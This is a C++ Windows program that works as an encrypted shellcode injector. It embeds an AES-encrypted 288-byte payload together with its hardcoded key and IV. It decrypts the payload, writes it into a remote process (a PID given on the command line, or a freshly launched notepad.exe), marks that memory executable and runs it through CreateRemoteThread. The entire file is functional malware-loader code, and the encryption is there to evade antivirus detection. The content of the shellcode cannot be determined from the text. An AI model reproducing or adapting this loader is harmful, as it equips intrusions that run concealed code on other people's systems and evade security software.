// Basic.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include "aes.h"

const char* k = "[+]";
const char* e = "[-]";

// Print the input buffer as a hex char array
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

    printf("unsigned char %s[] = {", Name);

    for (SIZE_T i = 0; i < Size; i++) {
        if (i % 16 == 0)
            printf("\n\t");

        if (i < Size - 1)
            printf("0x%02X, ", Data[i]);
        else
            printf("0x%02X ", Data[i]);
    }

    printf("\n};\n\n");
}

// Print the input buffer as a hex char array but just the 8 first char
VOID Print8CharHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {


    for (SIZE_T i = 0; i < 8; i++) {
        if (i % 16 == 0)
            printf("\n\t");

        if (i < 8 - 1)
            printf("0x%02X, ", Data[i]);
        else
            printf("0x%02X ", Data[i]);
    }

    printf("\n");
}

unsigned char pKey[] = {
        0x19, 0x0A, 0x4E, 0xE9, 0xD5, 0x0D, 0xDF, 0xA9, 0x77, 0xBB, 0x58, 0xF8, 0x9F, 0x44, 0xF8, 0xA5,
        0x2F, 0x14, 0x4C, 0x9D, 0xAC, 0xA8, 0xAD, 0x62, 0xE7, 0xA0, 0x0A, 0xB8, 0xDC, 0x16, 0xE8, 0xA2
};

unsigned char pIv[] = {
        0xC7, 0x64, 0xC2, 0xFA, 0x8C, 0x94, 0xEC, 0x87, 0x01, 0x20, 0xCA, 0xAB, 0x9F, 0x69, 0xC4, 0x79
};

byte shellcode[288] = {
        0xBB, 0xA5, 0x67, 0x1A, 0x28, 0xC9, 0xEE, 0x27, 0x20, 0xFC, 0x18, 0x18, 0x0B, 0x3D, 0x2E, 0x8B,
        0x9E, 0x07, 0xB6, 0x19, 0x1C, 0x74, 0xE0, 0x15, 0xBF, 0x5D, 0xE3, 0x4E, 0xD2, 0xD0, 0xA6, 0x29,
        0x71, 0xBC, 0x0C, 0x53, 0x04, 0xD3, 0x8C, 0x71, 0x21, 0x89, 0xEB, 0x78, 0xC2, 0xF2, 0xE7, 0x06,
        0x2F, 0x72, 0x27, 0x9E, 0xC2, 0xF8, 0xEB, 0x5E, 0x99, 0xC6, 0x65, 0x8A, 0x26, 0x05, 0xE8, 0x70,
        0x3E, 0x4D, 0xC2, 0x94, 0xF4, 0xCE, 0x2E, 0xD1, 0x60, 0x21, 0x0F, 0x38, 0x50, 0xEF, 0xE2, 0x20,
        0x34, 0x06, 0x04, 0xBB, 0x9B, 0x7E, 0x06, 0x8D, 0xE7, 0xA6, 0xC2, 0xC8, 0xA4, 0x08, 0xD0, 0xB2,
        0x5D, 0x9A, 0xF8, 0xCC, 0x2D, 0x67, 0x94, 0xA2, 0x12, 0x56, 0xB0, 0x96, 0x8A, 0x8E, 0x5B, 0x77,
        0x33, 0xEA, 0x1A, 0x8B, 0xE9, 0x95, 0xD1, 0x92, 0xCC, 0xA8, 0x36, 0xD7, 0x48, 0x31, 0x20, 0xB1,
        0x1B, 0xDC, 0x52, 0x9E, 0x94, 0x1A, 0xF5, 0xAC, 0x3E, 0x9E, 0x3E, 0xDF, 0xE5, 0x4C, 0x38, 0xE6,
        0x41, 0x54, 0x03, 0xB2, 0xB4, 0x2E, 0x3C, 0x57, 0x85, 0x66, 0x23, 0xF1, 0x3D, 0x54, 0x29, 0x81,
        0xDD, 0x4B, 0xDC, 0xFA, 0x39, 0xBB, 0xBF, 0x27, 0x82, 0xBE, 0xEA, 0x42, 0xC5, 0xFF, 0xD7, 0x6F,
        0xB4, 0x16, 0x8B, 0x44, 0x1A, 0xB1, 0x9D, 0xFF, 0x5C, 0x34, 0x43, 0x27, 0xCA, 0x4C, 0x65, 0x41,
        0xEF, 0x9D, 0xB8, 0xC0, 0x10, 0x5A, 0x3A, 0x32, 0xD0, 0x88, 0x2F, 0x29, 0x31, 0x18, 0x0F, 0xDE,
        0xC7, 0x6D, 0x28, 0xAF, 0xE9, 0xB3, 0x32, 0x7F, 0x3A, 0xB0, 0x40, 0x36, 0x41, 0x7F, 0x52, 0x66,
        0x4C, 0x52, 0x6D, 0x47, 0x32, 0x54, 0xDB, 0x0F, 0x85, 0xF8, 0x93, 0x9C, 0x46, 0x1A, 0xB7, 0x80,
        0xC9, 0x42, 0xAE, 0x0F, 0x4F, 0xB1, 0xBF, 0xFA, 0xC2, 0xF2, 0xB7, 0xC7, 0xC5, 0x60, 0x41, 0x3F,
        0xA3, 0x33, 0xC7, 0x88, 0x83, 0x9A, 0x59, 0xCE, 0xDB, 0x39, 0x4B, 0xF0, 0x81, 0x52, 0x1B, 0xB9,
        0xE2, 0x90, 0x6C, 0x98, 0x4A, 0x9B, 0x07, 0x20, 0x6A, 0x18, 0x52, 0x58, 0xA3, 0x92, 0x2B, 0x8D
};

void decryptAES() {
    // Struct needed for Tiny-AES library
    struct AES_ctx ctx;
    // Initializing the Tiny-AES Library
    AES_init_ctx_iv(&ctx, pKey, pIv);
    printf("%s The first encrypted bytes",k);
    Print8CharHexData("shellcode", shellcode, sizeof(shellcode));
    // Decrypting
    AES_CBC_decrypt_buffer(&ctx, shellcode, sizeof(shellcode));
    printf("%s The first decrypted bytes",k);
    Print8CharHexData("shellcode", shellcode, sizeof(shellcode));
    // Print the decrypted buffer to the console
    // PrintHexData("PlainText", shellcode, sizeof(shellcode));
}


int main(int argc, char* argv[])
{
    DWORD pid = 0;
    if (argc < 2) {
        printf("%s Usage: program.exe <PID>\n", e);
        wchar_t cmd[] = L"notepad.exe";
        LPWSTR lpCmd = cmd;
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;

        BOOL processCreated = CreateProcessW(NULL, lpCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

        printf("%s is the process created : %d\n", k, processCreated);

        pid = pi.dwProcessId;
        printf("%s process pid : %lu\n", k, pid);
    } if (argc == 2) {
        printf("%s argv1 : %s\n", k, argv[1]);
        pid = (DWORD)atoi(argv[1]);
        printf("%s PID used <%s>\n", k, argv[1]);

    }
    printf("%s PID used <%lu>\n", k, pid);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    printf("%s hProcess (pointer) = %p\n", k, (void*)hProcess);

    if (hProcess == 0) {
        DWORD getLastError = GetLastError();
        printf("%s failed to open the process : %ul\n", e, getLastError);
        return EXIT_FAILURE;
    }

    LPVOID allocatedMemory = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("%s allocateMemory (pointer) = %p\n", k, (void*)allocatedMemory);

    if (allocatedMemory == 0) {
        DWORD getLastError = GetLastError();
        CloseHandle(hProcess);
        printf("%s failed to allocate memory in remote process: %ul\n", e, getLastError);
        return EXIT_FAILURE;
    }

    
	decryptAES();
    SIZE_T bytesWritten = 0;
    if (WriteProcessMemory(hProcess, allocatedMemory, shellcode, sizeof(shellcode), &bytesWritten) == 0) {
        DWORD getLastError = GetLastError();
        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        printf("%s failed to write shellcode into the remote process memory: %ul\n", e, getLastError);
        return EXIT_FAILURE;
    }
    printf("%s bytes written: %llu\n", k, (unsigned long long)bytesWritten);

    DWORD oldProtect = 0;
    if (VirtualProtectEx(hProcess, allocatedMemory, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect) == 0) {
        DWORD getLastError = GetLastError();
        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        printf("%s failed to change memory permission in the remote process: %ul\n", e, getLastError);
        return EXIT_FAILURE;
    }
    printf("%s change memory protection to RX\n", k);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);
    if (hThread == 0) {
        DWORD getLastError = GetLastError();
        VirtualFreeEx(hProcess, allocatedMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        printf("%s failed to create remote thread %ul\n", e, getLastError);
        return EXIT_FAILURE;
    }

    WaitForSingleObject(hThread, INFINITE);


    printf("yay\n");
    CloseHandle(hProcess);
    return EXIT_SUCCESS;
}
